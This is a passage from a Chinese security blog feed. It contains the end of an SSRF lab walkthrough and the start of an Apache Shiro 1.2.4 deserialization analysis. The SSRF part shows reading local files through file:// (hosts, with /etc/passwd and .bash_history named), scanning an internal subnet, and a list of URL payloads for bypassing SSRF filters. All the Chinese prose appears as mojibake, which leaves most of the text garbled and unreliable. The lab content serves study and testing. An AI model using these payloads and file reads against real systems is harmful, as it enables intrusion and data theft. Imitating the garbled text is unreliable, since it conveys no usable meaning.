alt="image-20221007172006303"></a></p><h2 id="äº”ã€æ¼æ´å¤ç°"><a href="#äº”ã€æ¼æ´å¤ç°" class="headerlink" title="äº”ã€æ¼æ´å¤ç°"></a>äº”ã€æ¼æ´å¤ç°</h2><p>ç”±äºç½‘ç«™æœ‰å¯¹å¤–è¯·æ±‚çš„åŠŸèƒ½ç‚¹ï¼Œæ‰€ä»¥å°è¯•æ˜¯å¦å­˜åœ¨ SSRF </p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170010476.png" data-caption="image-20221007170010476"><img src="/../images/ssrf/image-20221007170010476.png" alt="image-20221007170010476"></a></p><p>å¯¹å¤–è¯·æ±‚æµ‹è¯•ï¼Œæµ‹è¯•è¯æ˜å¯ä»¥å¯¹å¤–å‘èµ·è¯·æ±‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170254968.png" data-caption="image-20221007170254968"><img src="/../images/ssrf/image-20221007170254968.png" alt="image-20221007170254968"></a></p><p>å°è¯•å¯¹å†…ç½‘å‘èµ·è¯·æ±‚ï¼Œä¼šä¸ä¼šæœ‰å“åº”ï¼Œæµ‹è¯• 127.0.0.1 ç«™ç‚¹ï¼Œå­˜åœ¨å“åº”ï¼Œç”±äºè¯¥ç½‘ç«™ç«¯å£ä¸º 8002 ï¼Œæµ‹è¯•è¯·æ±‚127.0.0.1ï¼š8002 ç«¯å£ï¼Œå³å†…ç½‘è¯·æ±‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170432511.png" data-caption="image-20221007170432511"><img src="/../images/ssrf/image-20221007170432511.png" alt="image-20221007170432511"></a></p><p>æˆåŠŸå“åº”ï¼Œè¯æ˜å­˜åœ¨ SSRF ï¼Œä¸ºå›æ˜¾å‹ SSRF</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170651376.png" data-caption="image-20221007170651376"><img src="/../images/ssrf/image-20221007170651376.png" alt="image-20221007170651376"></a></p><p>åˆ©ç”¨ Burp æŠ“åŒ…ï¼Œå®šä½åˆ°æ¼æ´å‚æ•°ä¸º urlï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ææ¼æ´ç‚¹è¿›è¡Œå†…ç½‘æ¢æµ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170820274.png" data-caption="image-20221007170820274"><img src="/../images/ssrf/image-20221007170820274.png" alt="image-20221007170820274"></a></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥<code>åˆ©ç”¨ SSRF è·å–æœ¬æœº hosts æ–‡ä»¶</code>ï¼ŒæŸ¥çœ‹æœ¬æœºä¿¡æ¯ï¼Œlinuxåˆ™å¯ä»¥è¯»å– &#x2F;etc&#x2F;passwdã€.bash_history ç­‰æ–‡ä»¶ã€‚</p><p>åˆ©ç”¨ file åè®®è¯»å–æ–‡ä»¶ï¼Œ<code>file:///C:\Windows\System32\drivers\etc\hosts</code>ï¼Œå‘ç°å­˜åœ¨ 192.168.114.0 ç½‘æ®µã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†ç›®æ ‡è½¬ä¸ºå¯¹è¯¥ç½‘æ®µçš„æ¢æµ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007172122214.png" data-caption="image-20221007172122214"><img src="/../images/ssrf/image-20221007172122214.png" alt="image-20221007172122214"></a></p><p>å¯¹ 192.168.114.0&#x2F;24ï¼Œç½‘æ®µè¿›è¡Œæ¢æµ‹ã€‚åˆ©ç”¨ Burp Custom iterator(è‡ªå®šä¹‰è¿­ä»£å™¨)åŠŸèƒ½è¿›è¡Œçˆ†ç ´ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çˆ†ç ´IP+ç«¯å£ï¼Œè¡¨ç°å½¢å¼ä¸º <code>1:8000</code>ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªå‚æ•°éœ€è¦è¿›è¡Œçˆ†ç ´ï¼Œè¿­ä»£å™¨éœ€è¦é€‰æ‹©2ä¸ªï¼Œä»¥ <code>:</code>ï¼Œä½œä¸ºåˆ†éš”ç¬¦ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007183132200.png" data-caption="image-20221007183132200"><img src="/../images/ssrf/image-20221007183132200.png" alt="image-20221007183132200"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007183424214.png" data-caption="image-20221007183424214"><img src="/../images/ssrf/image-20221007183424214.png" alt="image-20221007183424214"></a></p><p>åŸç†å·²çŸ¥çŸ¥é“äº†ï¼Œè¿™é‡Œçš„ä¸æ”¾å¤§å­—å…¸è·‘æµªè´¹æ—¶é—´äº†ï¼ŒéªŒè¯å­˜åœ¨å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007183450725.png" data-caption="image-20221007183450725"><img src="/../images/ssrf/image-20221007183450725.png" alt="image-20221007183450725"></a></p><p>é€šè¿‡Funzing å¾—çŸ¥åŒç½‘æ®µä¸­å­˜åœ¨ <code>192.168.114.141:9000</code>ã€<code>192.168.114.141:9001</code> ä¸¤ä¸ªç«™ç‚¹</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007184331198.png" data-caption="image-20221007184331198"><img src="/../images/ssrf/image-20221007184331198.png" alt="image-20221007184331198"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007184353393.png" data-caption="image-20221007184353393"><img src="/../images/ssrf/image-20221007184353393.png" alt="image-20221007184353393"></a></p><p>æ¥ä¸‹æ¥è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œæ¢æµ‹åˆšæ‰æ‰¾å¯»å‡ºæ¥çš„ç«™ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p><h3 id="SSRF-CodeExec-ä»£ç æ‰§è¡Œ"><a href="#SSRF-CodeExec-ä»£ç æ‰§è¡Œ" class="headerlink" title="SSRF CodeExec ä»£ç æ‰§è¡Œ"></a>SSRF CodeExec ä»£ç æ‰§è¡Œ</h3><p>å› ä¸ºæ˜¯ç›´æ¥æ­å»ºçš„ç¯å¢ƒï¼Œå±äºä¸Šå¸è§†è§’ï¼Œç›´æ¥æ¥åˆ°æœ€åä¸€æ­¥äº†ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ï¼Œå›æ˜¾å‹çš„ SSRF å¯ä»¥é€šè¿‡è¿”å›çš„ä¿¡æ¯ä»è€Œè·çŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»è€Œè¾¾åˆ°å†…ç½‘æ¢æµ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007184707998.png" data-caption="image-20221007184707998"><img src="/../images/ssrf/image-20221007184707998.png" alt="image-20221007184707998"></a></p><p>è¿™ä¸ªé©¬å„¿æ˜¯ç¯å¢ƒè‡ªå¸¦çš„ã€‚</p><p>â€‹</p><h3 id="SSRF-XXE"><a href="#SSRF-XXE" class="headerlink" title="SSRF XXE"></a>SSRF XXE</h3><p>é€šè¿‡å›æ˜¾æŠ“å–POSTåŒ…ï¼Œå¹¶è¿›è¡Œæ¢æµ‹ï¼Œåœ¨å®æˆ˜ä¸­å¯èƒ½å­˜åœ¨å„ç§æƒ…å†µï¼Œä¹Ÿè®¸åªèƒ½æ¢æµ‹ï¼Œå…¶ä»–å•¥ä¹Ÿåšä¸äº†ï¼Œå…·ä½“å¾—çœ‹å…·ä½“ç¯å¢ƒã€‚</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007185255038.png" data-caption="image-20221007185255038"><img src="/../images/ssrf/image-20221007185255038.png" alt="image-20221007185255038"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007185308197.png" data-caption="image-20221007185308197"><img src="/../images/ssrf/image-20221007185308197.png" alt="image-20221007185308197"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007185521598.png" data-caption="image-20221007185521598"><img src="/../images/ssrf/image-20221007185521598.png" alt="image-20221007185521598"></a></p><p>çœ‹åˆ°ä½¿ç”¨ XML æ ¼å¼ï¼Œå°è¯•æ„é€  XXE è¯­å¥è¿›è¡Œæ¼æ´æµ‹è¯•ã€‚è¿™é‡Œç•™ä¸ªå‘ï¼Œæœ‰å…´è¶£çš„å¯ä»¥ç›´æ¥æŸ¥çœ‹å‚è€ƒæ–‡ç« ç¬¬ä¸€ç¯‡ï¼Œå‰è¾ˆçš„ç¯å¢ƒã€è®²è§£ã€è¨€è¯­å‹å¥½æ˜“æ‡‚ï¼Œå€¼å¾—æ¨èã€‚</p><h2 id="å…­ã€Bypass"><a href="#å…­ã€Bypass" class="headerlink" title="å…­ã€Bypass"></a>å…­ã€Bypass</h2><p>SSRF æµ‹è¯•åŠŸèƒ½ç‚¹æ—¶ï¼Œå¸¸è§„ Payload æ²¡æœ‰å‘ç°å­˜åœ¨ SSRF ä¹Ÿè®¸æ˜¯åå°å¯¹å…¶è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ Fuzzing è¿›è¡Œ Bypassã€‚åç»­å¯¹ Fuzzing å­¦ä¹ æ—¶å†è¿›ä¸€æ­¥æ·±å…¥ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://google.com:80+&amp;@127.88.23.245:22/#+@google.com:80/</span><br><span class="line">http://127.88.23.245:22/+&amp;@google.com:80#+@google.com:80/</span><br><span class="line">http://google.com:80+&amp;@google.com:80#+@127.88.23.245:22/</span><br><span class="line">http://127.88.23.245:22/?@google.com:80/</span><br><span class="line">http://127.88.23.245:22/#@www.google.com:80/</span><br><span class="line">http://google.com:80\\@127.88.23.245:22/</span><br></pre></td></tr></table></figure></div><h2 id="ä¸ƒã€å°ç»“"><a href="#ä¸ƒã€å°ç»“" class="headerlink" title="ä¸ƒã€å°ç»“"></a>ä¸ƒã€å°ç»“</h2><p>é€šè¿‡å‰è¾ˆä»¬çš„é¶åœºä»¥åŠæ–‡ç« ï¼Œè¿›ä¸€æ­¥åŠ æ·±å¯¹ SSRF çš„äº†è§£ã€‚ä¸ç§¯è·¬æ­¥ï¼Œæ— ä»¥è‡³åƒé‡Œã€‚</p><h2 id="å…«ã€å‚è€ƒæ–‡ç« "><a href="#å…«ã€å‚è€ƒæ–‡ç« " class="headerlink" title="å…«ã€å‚è€ƒæ–‡ç« "></a>å…«ã€å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.sqlsec.com/2021/05/ssrf.html</span><br><span class="line">https://mp.weixin.qq.com/s/EYVFHgNClgNGrk_92PZ90A</span><br><span class="line">https://cloud.tencent.com/developer/article/1561355</span><br><span class="line">https://yinwc.github.io/2018/11/16/SSRF/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEBæ¼æ´ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å­¦ä¹  </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiroååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
      <link href="/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>âš ï¸ è¯¥æ–‡ç« åªä½œå­¦ä¹ è®°å½•ï¼Œå…¶æ–‡ç« æ·±åº¦å¹¶ä¸èƒ½ä½œä¸ºå­¦ä¹ ç ”ç©¶æ‰€ç”¨ï¼Œæ–‡ç« æ¼æ´ä»£ç åˆ†æéƒ¨åˆ†æˆ–æœ‰ä¹±åºï¼Œè¯·ä¸è¦å°†è¯¥æ–‡ç« ä½œä¸ºæ­£ç¡®çš„æ¼æ´åˆ†ææ–‡ç« ï¼Œå¯ç›´æ¥è½¬è‡³å‚è€ƒæ–‡ç« å­¦ä¹ æ¼æ´åŸç†ã€‚</p><h2 id="äºŒã€Java-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#äºŒã€Java-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="äºŒã€Java åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>äºŒã€Java åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p><code>Java åºåˆ—åŒ–</code> æ˜¯æŒ‡æŠŠ Java <code>å¯¹è±¡</code>è½¬æ¢ä¸º<code>å­—èŠ‚åºåˆ—</code>çš„è¿‡ç¨‹ä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­ï¼Œ<code>ObjectOutputStream</code> ç±»çš„ <code>writeObject()</code> æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚ </p><p><code>Javaååºåˆ—åŒ–</code> æ˜¯æŒ‡æŠŠ<code>å­—èŠ‚åºåˆ—</code>æ¢å¤ä¸º Java <code>å¯¹è±¡</code> çš„è¿‡ç¨‹ï¼Œ<code>ObjectInputStream</code> ç±»çš„ <code>readObject()</code> æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">          <span class="comment">//å®šä¹‰objå¯¹è±¡</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">          <span class="comment">//åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„â€objectâ€æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">          <span class="comment">//writeObject()æ–¹æ³•å°†objå¯¹è±¡å†™å…¥objectæ–‡ä»¶</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">          <span class="comment">//ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">          <span class="comment">//æ¢å¤å¯¹è±¡</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åºåˆ—åŒ–æ˜¯è®© Java å¯¹è±¡è„±ç¦» Java è¿è¡Œç¯å¢ƒçš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥æœ‰æ•ˆçš„å®ç°å¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ã€å¯¹è±¡æŒä¹…åŒ–å­˜å‚¨ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼›</span><br><span class="line">åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—,æ¥æ”¶æ–¹æ¥æ”¶åˆ°å­—ç¬¦åºåˆ—åï¼Œä½¿ç”¨ååºåˆ—åŒ–ä»å­—èŠ‚åºåˆ—ä¸­æ¢å¤å‡ºJavaå¯¹è±¡;</span><br></pre></td></tr></table></figure></div><br/><hr><h2 id="ä¸‰ã€æ¼æ´ç¯å¢ƒæ­å»º"><a href="#ä¸‰ã€æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸‰ã€æ¼æ´ç¯å¢ƒæ­å»º"></a>ä¸‰ã€æ¼æ´ç¯å¢ƒæ­å»º</h2><p>1ã€Shiroæºç ä¸‹è½½ï¼Œå¹¶å¯¼å…¥ IDEA</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928202955004.png" data-caption="image-20220928202955004"><img src="/../images/shiro/image-20220928202955004.png" alt="image-20220928202955004"></a></p><p>2ã€é…ç½® tomcat ç¯å¢ƒ</p><p>é…ç½® tomcat å‰å…ˆé…ç½®æ–‡ä»¶è¾“å‡ºè·¯å¾„ï¼Œä¸ç„¶åç»­é…ç½® tomcat ä¼šå› ä¸ºæ²¡æœ‰å®šä¹‰è¾“å‡ºè·¯å¾„è€ŒæŠ¥é”™</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203618300-16643686711181.png" data-caption="image-20220928203618300"><img src="/../images/shiro/image-20220928203618300-16643686711181.png" alt="image-20220928203618300"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203753728.png" data-caption="image-20220928203753728"><img src="/../images/shiro/image-20220928203753728.png" alt="image-20220928203753728"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203915011.png" data-caption="image-20220928203915011"><img src="/../images/shiro/image-20220928203915011.png" alt="image-20220928203915011"></a></p><p>é…ç½® tomcat</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203035559.png" data-caption="image-20220928203035559"><img src="/../images/shiro/image-20220928203035559.png" alt="image-20220928203035559"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203130826.png" data-caption="image-20220928203130826"><img src="/../images/shiro/image-20220928203130826.png" alt="image-20220928203130826"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928204038094-16643688406673.png" data-caption="image-20220928204038094"><img src="/../images/shiro/image-20220928204038094-16643688406673.png" alt="image-20220928204038094"></a></p><p>æŒ‡å®šæ¼æ´ shiro ååºåˆ—æ¼æ´ war åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205231718.png" data-caption="image-20220928205231718"><img src="/../images/shiro/image-20220928205231718.png" alt="image-20220928205231718"></a></p><p>ç‚¹å‡»å³ä¸Šè§’è¿è¡Œç¬¦å·</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205446844.png" data-caption="image-20220928205446844"><img src="/../images/shiro/image-20220928205446844.png" alt="image-20220928205446844"></a><br>æˆåŠŸæ­å»º</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205531084.png" data-caption="image-20220928205531084"><img src="/../images/shiro/image-20220928205531084.png" alt="image-20220928205531084"></a></p><p>é…ç½®æœ¬åœ°IP æ–¹ä¾¿ burpæŠ“åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928210335367.png" data-caption="image-20220928210335367"><img src="/../images/shiro/image-20220928210335367.png" alt="image-20220928210335367"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928210423508.png" data-caption="image-20220928210423508"><img src="/../images/shiro/image-20220928210423508.png" alt="image-20220928210423508"></a></p><p>é…ç½® JDK</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205046633.png" data-caption="image-20220928205046633"><img src="/../images/shiro/image-20220928205046633.png" alt="image-20220928205046633"></a></p><h2 id="å››ã€æ¼æ´åˆ†æ"><a href="#å››ã€æ¼æ´åˆ†æ" class="headerlink" title="å››ã€æ¼æ´åˆ†æ"></a>å››ã€æ¼æ´åˆ†æ</h2><h3 id="1ã€æ¼æ´åŸç†"><a href="#1ã€æ¼æ´åŸç†" class="headerlink" title="1ã€æ¼æ´åŸç†"></a>1ã€æ¼æ´åŸç†</h3><p>Shiroâ‰¤1.2.4 ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨ CookieRememberMeManagerï¼ŒæŒä¹…åŒ–åœ°å°†ä¿¡æ¯åºåˆ—åŒ–ååŠ å¯†åä¿å­˜åœ¨ Cookie çš„ rememberMe å­—æ®µä¸­ï¼Œå½“ç³»ç»Ÿä¸‹æ¬¡è¯»å–æ—¶å…ˆè¿›è¡Œè§£å¯†å†ååºåˆ—åŒ–ä»è€Œè·å–ä¿¡æ¯ã€‚ç”±äºè¯¥ç‰ˆæœ¬å†…ç½®äº†ä¸€ä¸ªé»˜è®¤ä¸”å›ºå®šçš„ç”± AES åŠ å¯† çš„ç¡¬ç¼–ç  Key å€¼ ï¼Œå› æ­¤æ”»å‡»è€…å¯é€šè¿‡ä½¿ç”¨é»˜è®¤çš„ Key å¯¹æ¶æ„æ„é€ çš„åºåˆ—åŒ–æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå½“ CookieRememberMeManager å¯¹æ¶æ„çš„ rememberMe è¿›è¡Œå¤„ç†æ—¶ï¼Œæœ€ç»ˆä¼šå¯¹æ¶æ„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>ç”¨æˆ·è·å–è¯·æ±‚ï¼Œç³»ç»Ÿä¸»è¦å¤„ç†è¿‡ç¨‹ï¼š<code>è·å– Cookie ä¸­ rememberMe çš„å€¼ -ã€‹ å¯¹ rememberMe è¿›è¡Œ Base64 è§£ç  -ã€‹ä½¿ç”¨ AES è¿›è¡Œè§£å¯† -ã€‹å¯¹è§£å¯†çš„å€¼è¿›è¡Œååºåˆ—åŒ–</code></p><h3 id="2ã€ä»£ç åˆ†æ"><a href="#2ã€ä»£ç åˆ†æ" class="headerlink" title="2ã€ä»£ç åˆ†æ"></a>2ã€ä»£ç åˆ†æ</h3><h4 id="åŠ å¯†åˆ†æ"><a href="#åŠ å¯†åˆ†æ" class="headerlink" title="åŠ å¯†åˆ†æ"></a>åŠ å¯†åˆ†æ</h4><p><code>shiro-shiro-root-1.2.4/core/src/main/java/org/apache/shiro/mgtorg/apache/shiro/mgt/DefaultSecurityManager.java</code> ä»£ç ä¸­å¯çŸ¥ï¼Œç”± rememberMeSuccessfulLogin æ–¹æ³•ï¼Œå®šä¹‰æ˜¯å¦ç™»å½•æˆåŠŸï¼Œåˆ›å»ºå¯¹è±¡ rmm</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001165149272.png" data-caption="image-20221001165149272"><img src="/../images/shiro/image-20221001165149272.png" alt="image-20221001165149272"></a></p><p>è·Ÿè¿›å¯¹è±¡çš„ rmm çš„ onSuccessfulLogin æ–¹æ³•ï¼Œé€šè¿‡å…¨å±€æœç´¢å®šä½åˆ° onSuccessfulLogin å®ç°ä»£ç ä½äº AbstractRememberMeManager.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001170316531.png" data-caption="image-20221001170316531"><img src="/../images/shiro/image-20221001170316531.png" alt="image-20221001170316531"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                      <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨ forgetIdentity æ–¹æ³•å¯¹ subject è¿›è¡Œå¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001170628404.png" data-caption="image-20221001170628404"><img src="/../images/shiro/image-20221001170628404.png" alt="image-20221001170628404"></a></p><p>ç»§ç»­è·Ÿè¿› forgetIdentity æ–¹æ³•ï¼ŒæŸ¥çœ‹å…¶å…·ä½“å®ç°ä»£ç ï¼Œå®šä½åˆ°å®ç°ä»£ç ä½ç½®ä¸º CookieRememberMeManager.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001171009787.png" data-caption="image-20221001171009787"><img src="/../images/shiro/image-20221001171009787.png" alt="image-20221001171009787"></a></p><p>ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(Subject subject)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line">            forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Removes the &#x27;rememberMe&#x27; cookie from the associated &#123;<span class="doctag">@link</span> WebSubjectContext&#125;&#x27;s request/response pair.</span></span><br><span class="line"><span class="comment">     * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">     * The &#123;<span class="doctag">@code</span> SubjectContext&#125; instance is expected to be a &#123;<span class="doctag">@link</span> WebSubjectContext&#125; instance with an HTTP</span></span><br><span class="line"><span class="comment">     * Request/Response pair.  If it is not a &#123;<span class="doctag">@code</span> WebSubjectContext&#125; or that &#123;<span class="doctag">@code</span> WebSubjectContext&#125; does not</span></span><br><span class="line"><span class="comment">     * have an HTTP Request/Response pair, this implementation does nothing.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subjectContext the contextual data, usually provided by a &#123;<span class="doctag">@link</span> Subject.Builder&#125; 